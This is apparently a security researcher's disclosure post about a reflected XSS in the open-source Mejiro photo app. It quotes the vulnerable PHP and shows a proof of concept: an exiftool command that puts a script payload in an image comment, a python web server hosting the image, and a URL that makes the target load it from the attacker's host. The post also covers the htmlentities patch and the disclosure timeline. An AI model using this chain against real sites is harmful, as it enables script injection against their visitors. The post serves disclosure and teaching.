---
layout: post
title: Mejiro Reflected XSS Via Remote File Inclusion
thumbnail-img: /assets/img/CVE-2022-27475/bug.png
tags: [CVE]
---

```
Title: Mejiro Reflected XSS Via Remote File Inclusion
Risk: 6.1 Medium CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Versions Affected: Before commit 3096393
Identifier: TBD
Authors: Aaron Haymore
```

## Summary
I have identified a reflected cross-site scripting (XSS) vulnerability in a GitHub project known as Mejiro, which is an open-source photo publishing application. This XSS vulnerability can be exploited due to two critical factors. The first factor involves how `index.php` loads photos, while the second factor pertains to how the application processes metadata.
## Details
The core of the vulnerability lies within `index.php`. As seen from the code below, the application is extracting metadata using `exif` and saving them to their respective variables.
```php
// Get aperture, exposure, iso, and datetime from EXIF
$aperture = (is_null($exif['COMPUTED']['ApertureFNumber']) ? null : $exif['COMPUTED']['ApertureFNumber']);
$exposure = (is_null($exif['EXIF']['ExposureTime']) ? null : $exif['EXIF']['ExposureTime']);
// Normalize exposure
// https://stackoverflow.com/questions/3049998/parsing-exifs-exposuretime-using-php
if (!is_null($exposure)) {
	$parts = explode("/", $exposure);
	if (($parts[1] % $parts[0]) == 0 || $parts[1] == 1000000) {
		$exposure = ' &bull; 1/' . round($parts[1] / $parts[0], 0);
	} else {
		if ($parts[1] == 1) {
			$exposure = ' &bull; ' . $parts[0];
		} else {
			$exposure = ' &bull; ' . $parts[0] . '/' . $parts[1];
		}
	}
}
$iso = (is_null($exif['EXIF']['ISOSpeedRatings']) ? null : " &bull; " . $exif['EXIF']['ISOSpeedRatings']);
$datetime = $exif['EXIF']['DateTimeOriginal'] ?? null;
$comment = $exif['COMMENT']['0'] ?? null;
```

A little further down in `index.php`, you can see how this information and photo are displayed to the user. It outputs each of the variables taken from above to the webpage.
```php
// Show photo, EXIF data, description, and info
// Enable the download link if $download = true
$raw = (!empty($raw_file[0]) ? '&raw=' .  $raw_file[0] : null);
if ($download) {
	echo '<div class="center"><a href="' . htmlentities($file) . '" download><img style="max-width: 100%; border-radius: 7px;" src="' . htmlentities($tim) . '" alt="' . $file_path['filename'] . '" title="' . $file_path['filename'] . '"></a><div class="caption">' . $comment . ' ' . $description . '</div><div class="caption">' . $exif_info . '<a href="delete.php?file=' . $file . $raw . '"><img style="margin-left: 1em;" src="svg/bin.svg" alt="' . L::img_delete . '" title="' . L::img_delete . '" /></a></div>';
} else {
	echo '<div class="center"><img style="max-width: 100%; border-radius: 7px;" src="' . htmlentities($tim) . '" alt="' . $file_path['filename'] . '" title="' . $file_path['filename'] . '"><div class="caption">' . $comment . ' ' . $description . '</div><div class="caption">' . $exif_info . '<a href="delete.php?file=' . $file . $raw . '"><img style="margin-left: 1em;" src="svg/remove-image.svg" alt="' . L::img_delete . '" title="' . L::img_delete . '" /></a></div>';
}
```

Notice that there is no sanitization between when the data is extracted and displayed to the user. Input sanitization, also known as input validation, is the process of inspecting and cleaning data received from untrusted or unvalidated sources to ensure it is safe. The primary goal of input sanitization is to protect against malicious injection-type attacks. 

As an attacker, if I can manipulate variables like $comment, $description, or any other field within $exif_info, it could result in a cross-site scripting vulnerability. This bug alone does not have an impact because all the photos here are controlled by the author. There is no upload function; they have to be manually placed on the file system.

However, I was able to find a remote file inclusion vulnerability in `index.php` on the `photo` variable (it is worth noting that LFI was not possible and it would only load images). By exploiting this vulnerability, I was able to host a malicious file that contained embedded JavaScript within its metadata. When the application processes my malicious file, it extracts the JavaScript, executing it when someone visits the page.
```php
$file = (isset($_GET['photo']) ? $_GET['photo'] : null);
```

## Proof Of Concept 
To illustrate the exploit, I injected a malicious payload into a seemingly innocent 'dog.jpg' file:
```
[zonifer@dell Sandbox]$ exiftool -Comment='<script>alert("XSS")</script>' dog.jpg
    1 image files updated
```

Next, I hosted the payload on a basic `python3` web server:
```
[zonifer@dell Sandbox]$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.1.17 - - [09/Oct/2023 00:33:12] "GET /dog.jpg HTTP/1.0" 200 -
```

To trigger the XSS, I navigated to:

`http://10.10.1.17/mejiro/index.php?all=1&photo=http://10.50.1.2/dog.jpg`

As a result, the XSS payload executed as expected.
![CVE-2022-27475](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/20231009003326.png)

## Patch
To patch this vulnerability, the simplest solution is to utilize `htmlentities`. `htmlentities` is a PHP function used to convert special characters in a string to their respective HTML entities.

For example, characters like `<`, `>`, `&`, and double quotes `"` have special meanings in HTML. If they are not properly escaped, malicious users can inject code into web pages. `htmlentities` replaces these characters with their HTML entity equivalents, making it safe to display content on a webpage.

As an example, a malicious script to spawn an alert box would be:
```
<script>alert("XSS")</script>
```

After processing it through `htmlentities`, it would be:
```
`&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;`
```

You can view the fix [here](https://github.com/dmpop/mejiro/commit/309639339f5816408865902befe8c90cb6862537), It essentially does what is just described above. It takes each of the EXIF data fields and processes it through `htmlentities` to strip away any possibility of malicious JavaScript.
## Report Timeline
```
10-9-2023: Vulnerability discovered and reported to the author.
10-10-2023: The author acknowledged the report and asked for suggestions to fix the issue.
10-10-2023: Response provided to the author, suggesting ways to fix the vulnerability.
10-15-2023: The patch was successfully pushed
```

## Conclusion
The Reflected XSS vulnerability in Mejiro underscores the importance of thorough security testing in web applications. It serves as a reminder that even seemingly benign elements, such as image metadata, can be exploited by malicious actors to compromise the security of a system. The timely response of the Mejiro development team in implementing the suggested patch is commendable and highlights the importance of collaboration in ensuring the security of web applications. By addressing such vulnerabilities proactively, we contribute to a safer and more reliable digital landscape.
